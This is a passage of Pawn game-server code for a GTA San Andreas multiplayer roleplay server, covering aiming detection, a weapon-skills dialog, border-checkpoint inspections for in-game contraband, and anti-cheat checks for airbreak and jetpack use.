	return floatsqroot((tmpX - ObjX) * (tmpX - ObjX) + (tmpY - ObjY) * (tmpY - ObjY) + (tmpZ - ObjZ) * (tmpZ - ObjZ));
}
stock Float:GetPointAngleToPoint(Float:x2, Float:y2, Float:X, Float:Y)
{
  	new Float:DX, Float:DY;
  	new Float:angle;

  	DX = floatabs(floatsub(x2,X));
  	DY = floatabs(floatsub(y2,Y));

  	if (DY == 0.0 || DX == 0.0)
	{
	    if(DY == 0 && DX > 0) angle = 0.0;
	    else if(DY == 0 && DX < 0) angle = 180.0;
	    else if(DY > 0 && DX == 0) angle = 90.0;
	    else if(DY < 0 && DX == 0) angle = 270.0;
	    else if(DY == 0 && DX == 0) angle = 0.0;
  	}
  	else
	{
    	angle = atan(DX/DY);
    	if(X > x2 && Y <= y2) angle += 90.0;
    	else if(X <= x2 && Y < y2) angle = floatsub(90.0, angle);
    	else if(X < x2 && Y >= y2) angle -= 90.0;
    	else if(X >= x2 && Y > y2) angle = floatsub(270.0, angle);
  	}
  	return floatadd(angle, 90.0);
}
stock GetXYInFrontOfPoint(&Float:x, &Float:y, Float:angle, Float:distance)
{
	x += (distance * floatsin(-angle, degrees));
	y += (distance * floatcos(-angle, degrees));
}
stock IsPlayerAimingAt(playerid, Float:x, Float:y, Float:z, Float:radius)
{
  	new Float:camera_x,Float:camera_y,Float:camera_z,Float:vector_x,Float:vector_y,Float:vector_z;
  	GetPlayerCameraPos(playerid, camera_x, camera_y, camera_z);
  	GetPlayerCameraFrontVector(playerid, vector_x, vector_y, vector_z);
	new Float:vertical, Float:horizontal;
	switch (GetPlayerWeapon(playerid))
	{
	  	case 34,35,36:
	  	{
	  		if (DistanceCameraTargetToLocation(camera_x, camera_y, camera_z, x, y, z, vector_x, vector_y, vector_z) < radius) return true;
	  		return false;
	  	}
	  	case 30,31: {vertical = 4.0; horizontal = -1.6;}
	  	case 33: {vertical = 2.7; horizontal = -1.0;}
	  	default: {vertical = 6.0; horizontal = -2.2;}
	}
  	new Float:angle = GetPointAngleToPoint(0, 0, floatsqroot(vector_x*vector_x+vector_y*vector_y), vector_z) - 270.0;
  	new Float:resize_x, Float:resize_y, Float:resize_z = floatsin(angle+vertical, degrees);
  	GetXYInFrontOfPoint(resize_x, resize_y, GetPointAngleToPoint(0, 0, vector_x, vector_y)+horizontal, floatcos(angle+vertical, degrees));
  	if (DistanceCameraTargetToLocation(camera_x, camera_y, camera_z, x, y, z, resize_x, resize_y, resize_z) < radius) return true;
  	return false;
}
stock ShowSkills(playerid, giveplayerid)
{
	new str[500],string[50];
    format(string,sizeof(string),"{FFFFFF}Pistol: {10F441}%d/100%%\n",pData[giveplayerid][pPistol_Skill]/100);
	strcat(str,string);
	format(string,sizeof(string),"{FFFFFF}Desert Eagle: {10F441}%d/100%%\n",pData[giveplayerid][pEagle_Skill]/100);
	strcat(str,string);
	format(string,sizeof(string),"{FFFFFF}ShotGun: {10F441}%d/100%%\n",pData[giveplayerid][pShotGun_Skill]/100);
	strcat(str,string);
	format(string,sizeof(string),"{FFFFFF}MP5: {10F441}%d/100%%\n",pData[giveplayerid][pMP5_Skill]/100);
	strcat(str,string);
	format(string,sizeof(string),"{FFFFFF}AK47: {10F441}%d/100%%\n",pData[giveplayerid][pAK47_Skill]/100);
	strcat(str,string);
	format(string,sizeof(string),"{FFFFFF}M4A1: {10F441}%d/100%%\n",pData[giveplayerid][pM4_Skill]/100);
	strcat(str,string);
	format(string,sizeof(string),"{FFFFFF}Sniper: {10F441}%d/100%%\n",pData[giveplayerid][pSniper_Skill]/100);
	strcat(str,string);
	ShowPlayerDialog(playerid,dMes,0,"{"#cGREEN"}Tiris Amonaweri",str,"CLOSE","");
	return true;
/*}
stock AntiCheat(playerid)
{
	if(!IsKicked(playerid) && !pData[playerid][pAdmin])
	{
	    if(GetPlayerSpecialAction (playerid) == SPECIAL_ACTION_USEJETPACK) NewKick(playerid);
	    new animlib[30], animname[30];
		GetAnimationName(GetPlayerAnimationIndex(playerid), animlib, sizeof(animlib), animname, sizeof(animname));
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && strcmp(animlib, "PED", true) == 0 && strcmp(animname, "RUN_PLAYER", true) == 0 && GetPlayerSkin(playerid) != 0)
		{
			SendClientMessage(playerid,0xB85A1CFF,"Shen Gaikike Chetis Gamoyenebistvis. (#0005)");
			NewKick(playerid);
		}
		if(WeaponInfo[playerid][GetPlayerWeapon(playerid)] == false && GetPlayerWeapon(playerid) != 40 && GetPlayerWeapon(playerid) != 0 && GetPlayerWeapon(playerid) != 46)
		{
			SendClientMessage(playerid, 0xB85A1CFF, "Shen Gaikike Chetis Gamoyenebistvis. (#0045)");
			SetPlayerAmmo(playerid, GetPlayerWeapon(playerid), 0);
	  		NewKick(playerid);
	    }
    }*/
}
forward Sabajo1(playerid);
public Sabajo1(playerid)
{
    new level = del(pData[playerid][pWanted],WANTED_TIME);
	if(!pData[playerid][pDrugs] && !pData[playerid][pAmmo] && !pData[playerid][pWanted])
	{
	    if(pData[playerid][pWanted]) return SendClientMessage(playerid,CGRAY,"Shen Idzebnebi!!");
		MoveDynamicObject(sabajo, 51.66476, -1535.85229, 4.28000, 3.0);
		SendClientMessage(playerid,CINFO,"Tqven Warmatebit Gaiaret Shemowmeba Sabajoze.");
		SendClientMessage(playerid,CINFO,"Shegidzliat Gadakvetot Sazgvari.");
		format(mes,sizeof(mes),"[Yuradgeba] %s'(a)m Gadakveta Sazgvari! [Suftaa]",Name2(playerid));
		DepartmentChat(CLIGHTRED,mes,0,0,1,1,0);
		SetTimerEx("Sabajos1",10000,false,"i",playerid);
	}
	if(pData[playerid][pDrugs] || pData[playerid][pAmmo])
	{
		SetPlayerWantedLevel(playerid,level);
		SendClientMessage(playerid,CGRAY,"Shen Agmogachnda Narkotiki/Iaragi. Es Monacemebi Gagzavnilia Policiashi!");
		format(mes1,sizeof(mes1),"[WARNING] %s's Sazgvris Gadakvetisas Agmoachnda Narkotiki/Iaragi",Name2(playerid));
		DepartmentChat(CRED,mes1);
	}
	if(pData[playerid][pWanted])
	{
		SetPlayerWantedLevel(playerid,level);
		SendClientMessage(playerid,CGRAY,"Shen Idzebnebi. Es Monacemebi Gagzavnilia Policiashi!");
		format(mes1,sizeof(mes1),"[WARNING] %s's Cdilobs Gadakvetos Sazgvari Ukanonod[Idzebneba]",Name2(playerid));
		DepartmentChat(CRED,mes1);
	}
	return true;
}
forward Sabajos1(playerid);
public Sabajos1(playerid)
{
    MoveDynamicObject(sabajo, 52.62290, -1528.91260, 4.28000, 3.0);
}
forward Sabajo2(playerid);
public Sabajo2(playerid)
{
    new level = del(pData[playerid][pWanted],WANTED_TIME);
	if(!pData[playerid][pDrugs] && !pData[playerid][pAmmo] && !pData[playerid][pWanted])
	{
	    if(pData[playerid][pWanted]) return SendClientMessage(playerid,CGRAY,"Shen Idzebnebi!!");
		MoveDynamicObject(sabajo2, 621.80896, -1196.86401, 17.45850, 3.0);
		SendClientMessage(playerid,CINFO,"Tqven Warmatebit Gaiaret Shemowmeba Sabajoze.");
		SendClientMessage(playerid,CINFO,"Shegidzliat Gadakvetot Sazgvari.");
		format(mes,sizeof(mes),"[Yuradgeba] %s'(a)m Gadakveta Sazgvari! [Suftaa]",Name2(playerid));
		DepartmentChat(CLIGHTRED,mes,0,0,1,1,0);
		SetTimerEx("Sabajos2",10000,false,"i",playerid);
	}
	if(pData[playerid][pDrugs] || pData[playerid][pAmmo])
	{
		SetPlayerWantedLevel(playerid,level);
		SendClientMessage(playerid,CGRAY,"Shen Agmogachnda Narkotiki/Iaragi. Es Monacemebi Gagzavnilia Policiashi!");
		format(mes1,sizeof(mes1),"[WARNING] %s's Sazgvris Gadakvetisas Agmoachnda Narkotiki/Iaragi",Name2(playerid));
		DepartmentChat(CRED,mes1);
	}
	if(pData[playerid][pWanted])
	{
		SetPlayerWantedLevel(playerid,level);
		SendClientMessage(playerid,CGRAY,"Shen Idzebnebi. Es Monacemebi Gagzavnilia Policiashi!");
		format(mes1,sizeof(mes1),"[WARNING] %s's Cdilobs Gadakvetos Sazgvari Ukanonod[Idzebneba]",Name2(playerid));
		DepartmentChat(CRED,mes1);
	}
	return true;
}
forward Sabajos2(playerid);
public Sabajos2(playerid)
{
    MoveDynamicObject(sabajo2, 615.95892, -1198.96472, 17.45850, 3.0);
}
forward Sabajo3(playerid);
public Sabajo3(playerid)
{
    new level = del(pData[playerid][pWanted],WANTED_TIME);
	if(!pData[playerid][pDrugs] && !pData[playerid][pAmmo] && !pData[playerid][pWanted])
	{
	    if(pData[playerid][pWanted]) return SendClientMessage(playerid,CGRAY,"Shen Idzebnebi!!");
		MoveDynamicObject(sabajo3, 634.50092, -1190.62537, 17.45850, 3.0);
		SendClientMessage(playerid,CINFO,"Tqven Warmatebit Gaiaret Shemowmeba Sabajoze.");
		SendClientMessage(playerid,CINFO,"Shegidzliat Gadakvetot Sazgvari.");
		format(mes,sizeof(mes),"[Yuradgeba] %s'(a)m Gadakveta Sazgvari! [Suftaa]",Name2(playerid));
		DepartmentChat(CLIGHTRED,mes,0,0,1,1,0);
		SetTimerEx("Sabajos3",10000,false,"i",playerid);
	}
	if(pData[playerid][pDrugs] || pData[playerid][pAmmo])
	{
		SetPlayerWantedLevel(playerid,level);
		SendClientMessage(playerid,CGRAY,"Shen Agmogachnda Narkotiki/Iaragi. Es Monacemebi Gagzavnilia Policiashi!");
		format(mes1,sizeof(mes1),"[WARNING] %s's Sazgvris Gadakvetisas Agmoachnda Narkotiki/Iaragi",Name2(playerid));
		DepartmentChat(CRED,mes1);
	}
	if(pData[playerid][pWanted])
	{
		SetPlayerWantedLevel(playerid,level);
		SendClientMessage(playerid,CGRAY,"Shen Idzebnebi. Es Monacemebi Gagzavnilia Policiashi!");
		format(mes1,sizeof(mes1),"[WARNING] %s's Cdilobs Gadakvetos Sazgvari Ukanonod[Idzebneba]",Name2(playerid));
		DepartmentChat(CRED,mes1);
	}
	return true;
}
forward Sabajos3(playerid);
public Sabajos3(playerid)
{
    MoveDynamicObject(sabajo3, 628.09796, -1193.59338, 17.45850, 3.0);
}
forward Sabajo4(playerid);
public Sabajo4(playerid)
{
    new level = del(pData[playerid][pWanted],WANTED_TIME);
	if(!pData[playerid][pDrugs] && !pData[playerid][pAmmo] && !pData[playerid][pWanted])
	{
	    if(pData[playerid][pWanted]) return SendClientMessage(playerid,CGRAY,"Shen Idzebnebi!!");
		MoveDynamicObject(sabajo4, 1660.9032, -60.7671, 35.3482, 3.0);
		SendClientMessage(playerid,CINFO,"Tqven Warmatebit Gaiaret Shemowmeba Sabajoze.");
		SendClientMessage(playerid,CINFO,"Shegidzliat Gadakvetot Sazgvari.");
		format(mes,sizeof(mes),"[Yuradgeba] %s'(a)m Gadakveta Sazgvari! [Suftaa]",Name2(playerid));
		DepartmentChat(CLIGHTRED,mes,0,0,1,1,0);
		SetTimerEx("Sabajos4",10000,false,"i",playerid);
	}
	if(pData[playerid][pDrugs] || pData[playerid][pAmmo])
	{
		SetPlayerWantedLevel(playerid,level);
		SendClientMessage(playerid,CGRAY,"Shen Agmogachnda Narkotiki/Iaragi. Es Monacemebi Gagzavnilia Policiashi!");
		format(mes1,sizeof(mes1),"[WARNING] %s's Sazgvris Gadakvetisas Agmoachnda Narkotiki/Iaragi",Name2(playerid));
		DepartmentChat(CRED,mes1);
	}
	if(pData[playerid][pWanted])
	{
		SetPlayerWantedLevel(playerid,level);
		SendClientMessage(playerid,CGRAY,"Shen Idzebnebi. Es Monacemebi Gagzavnilia Policiashi!");
		format(mes1,sizeof(mes1),"[WARNING] %s's Cdilobs Gadakvetos Sazgvari Ukanonod[Idzebneba]",Name2(playerid));
		DepartmentChat(CRED,mes1);
	}
	return true;
}
forward Sabajos4(playerid);
public Sabajos4(playerid)
{
    MoveDynamicObject(sabajo4, 1668.23169, -58.33839, 35.34820, 3.0);
}
forward OnPlayerAirbreak(playerid);
public OnPlayerAirbreak(playerid)
{
    new playername[24], string[128];
    GetPlayerName(playerid, playername, sizeof(playername));
    if (IsPlayerInAnyVehicle(playerid))
    {
        format(string,sizeof(string),"<< AntiAirBreake >> %s[%d] Iyenebs Airbrakes Manqanashi [Ping:%d]",playername,playerid,GetPlayerPing(playerid));
        AdminChat(CADMIN,string);
    }
    else
    {
        format(string,sizeof(string),"<< AntiAirBreake >> %s[%d] Iyenebs Airbrakes [Ping:%d]",playername,playerid,GetPlayerPing(playerid));
        AdminChat(CADMIN,string);
    }
    SendClientMessage(playerid, 0xB85A1CFF, "Washale Cheat An Dagedeba Ban");
    //GKick(playerid);
    return 1;
}
/*stock onCheckAirBrk(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		new string[100];
		new Float:currentPos[3],
		Float:distance;
		GetPlayerPos( playerid, currentPos[ 0 ], currentPos[1], currentPos[2]);
		distance = floatround( GetPlayerDistanceFromPoint(playerid, pData[playerid][pPos_x], pData[playerid][pPos_y], pData[playerid][pPos_z]));
		if(GetPVarInt(playerid, "AntiBreik") == 0 && GetPVarInt(playerid, "SpecBool") == 0 && GetPVarInt(playerid, "AFK_Time") < 2)
		{
		if(distance < 300 && distance > 90 && pData[playerid][pAdmin] == 0 && pData[playerid][pHelper] == 0)
			{
				format(string, 256, "[AntiCheat] %s[%i]: Gaikika! < AirBreak >", Name(playerid), playerid);
				SendClientMessageToAll(CREDD,string);
				SetTimerEx("kick",1000,false,"i",playerid);
			}
		}
		pData[ playerid ][ pPos_x ] = currentPos[ 0 ];
		pData[ playerid ][ pPos_y ] = currentPos[ 1 ];
		pData[ playerid ][ pPos_z ] = currentPos[ 2 ];
	}
}*/
